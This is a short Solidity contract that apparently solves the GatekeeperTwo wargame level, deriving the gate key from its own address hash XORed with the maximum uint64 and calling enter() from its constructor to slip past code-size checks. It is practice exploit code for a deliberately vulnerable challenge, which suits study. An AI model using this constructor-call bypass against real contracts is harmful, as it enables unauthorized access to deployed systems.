// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {GatekeeperTwo} from "./GatekeeperTwo.sol";

contract GatekeeperTwoAttack {
    constructor(address _target) {
        // 使用 address(this) - 攻击合约自己的地址
        bytes8 gateKey = bytes8(
            uint64(bytes8(keccak256(abi.encodePacked(address(this))))) 
            ^ type(uint64).max
        );
        
        GatekeeperTwo(_target).enter(gateKey);
    }
}

